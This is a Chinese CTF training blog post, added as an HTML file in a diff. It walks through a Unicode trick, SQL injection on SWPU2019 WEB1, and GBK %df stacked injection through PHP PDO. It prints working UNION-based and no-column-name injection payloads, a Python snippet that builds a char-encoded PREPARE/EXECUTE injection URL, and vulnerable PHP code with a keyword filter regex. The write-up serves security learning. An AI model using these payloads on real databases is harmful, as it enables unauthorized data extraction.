@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="disshu">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="CTF训练(part II)">
+  <meta property="og:description" content>
+  <meta property="og:site_name" content="disshu">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="disshu" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>disshu</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/disshu.github.io/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/disshu.github.io/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/disshu.github.io//img/cumt.png)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">CTF训练(part II)</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/disshu.github.io/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/disshu.github.io/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/disshu">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:15695257867@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By disshu</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-02-20</span>
+            <span class="time">06:26:35</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>第二阶段出击</p>
+<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>编码问题,这题要求你购买产品,但是总是出现如下提示,要求只填入一个char<br><img src="https://img-blog.csdnimg.cn/20200220185728972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再右击源代码发现hint utf-8很重要,所以我们就找&gt;10000的unicode码<br><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">https://www.compart.com/en/unicode/</a><br>在这个模块下<br><img src="https://img-blog.csdnimg.cn/20200220185935950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击other number,查询即可<br>然后查找他的UTF-8 Encoding:<br>将0x改为%,填入题中即可</p>
+<h1 id="从SWPU2019-WEB1学sql注入"><a href="#从SWPU2019-WEB1学sql注入" class="headerlink" title="从SWPU2019-WEB1学sql注入"></a>从SWPU2019-WEB1学sql注入</h1><p>这道题将注释符过滤了,所以可以在最后的字段数闭合,而且他将order by过滤<br>只能构造如下字句<br><code>-1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code><br>发现有22个 头疼<br>发现2和3回显<br>首先要查是哪个是数据库<br><code>-1&#39;union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code><br>mysql因为这题过滤了information_schema,可以使用ys.schema_table_statistics_with_buffer<br>这题还是maridb,查了官方文档,如下能查表名</p>
+<pre><code class="hljs undefined"><span class="hljs-number">-1</span>'union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,'<span class="hljs-number">22</span></code></pre>
+
+<p>接下来介绍一个无列名注入<br> <code>select</code>4<code>from (select 1,2,3,4,5,6 union select * from users)a;</code><br> 会把第四列的数据拿出来,但是这题中的反引号过滤了<br>用下列方法<br><code>select b from (select 1,2,3 as b,4,5 union select * from users)a;</code><br>但我们不知道是第四列所以要提前fuzzing一下<br><code>select b from (select 1,2 as b,3,4,5 union select * from users)a;</code><br>查第三字段,最后fuzzing到3的时候查到flag</p>
+<h1 id="gbk-pdd-sql注入"><a href="#gbk-pdd-sql注入" class="headerlink" title="gbk+pdd sql注入"></a>gbk+pdd sql注入</h1><p>PDO默认是允许多句执行和模拟预编译的,在参数可控的情况下，会导致堆叠注入。<br>在预编译的情况下,单引号和一些敏感字符会被转义,我们知道在gbk编码下通过%df可以绕过转义<br>pdd原理执行编译<br>Set @x=0x31<br>Prepare a from “select balabala from table1 where 1=?”<br>Execute a using @x<br>如下题</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span> 
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span><span class="hljs-params">($str)</span>
+    </span>&#123;
+        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))
+        &#123;
+            print_r($matches);
+            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+        &#125;
+        <span class="hljs-keyword">else</span>
+        &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">try</span>
+    &#123;
+        $db = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'******'</span>);
+    &#125; 
+    <span class="hljs-keyword">catch</span>(<span class="hljs-keyword">Exception</span> $e)
+    &#123;
+        <span class="hljs-keyword">echo</span> $e-&gt;getMessage();
+    &#125;
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>]))
+    &#123;
+        $id = $_GET[<span class="hljs-string">'id'</span>];
+    &#125;
+    <span class="hljs-keyword">else</span>
+    &#123;
+        $test = $db-&gt;query(<span class="hljs-string">"select balabala from table1"</span>);
+        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);
+        $id = $res[<span class="hljs-string">'balabala'</span>];
+    &#125;
+    <span class="hljs-keyword">if</span>(check($id))
+    &#123;
+        $query = <span class="hljs-string">"select balabala from table1 where 1=?"</span>;
+        $db-&gt;query(<span class="hljs-string">"set names gbk"</span>);
+        $row = $db-&gt;prepare($query);
+        $row-&gt;bindParam(<span class="hljs-number">1</span>,$id);
+        $row-&gt;execute();
+    &#125;</span></code></pre>
+
+<p>源码中写了多个关键字被过滤,办法之一就是全用char代替</p>
+<pre><code class="hljs undefined">pdo = <span class="hljs-string">"set @a=concat(&#123;&#125;);PREPARE charinject FROM @a;EXECUTE charinject;"</span>.format(charinject)
+		pdo += '||&#123;&#125;<span class="hljs-symbol">%271</span>&#123;&#125;<span class="hljs-symbol">%27</span>=&#123;&#125;<span class="hljs-symbol">%271</span>'.format(<span class="hljs-string">"%df"</span>,<span class="hljs-string">"%df"</span>,<span class="hljs-string">"%df"</span>)
+		url = 'http://<span class="hljs-number">6627</span>a<span class="hljs-number">3</span>ecadb<span class="hljs-number">74</span>fc<span class="hljs-number">8</span>a<span class="hljs-number">015</span><span class="hljs-keyword">c</span><span class="hljs-number">12</span>efa<span class="hljs-number">10641461</span>b<span class="hljs-number">80</span>f<span class="hljs-number">02696</span><span class="hljs-keyword">c</span><span class="hljs-number">4583</span>.changame.ichunqiu.com/?id=<span class="hljs-number">1</span><span class="hljs-symbol">%df</span><span class="hljs-symbol">%27</span><span class="hljs-comment">;&#123;&#125;'.format(pdo)</span></code></pre>
+
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/disshu.github.io/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
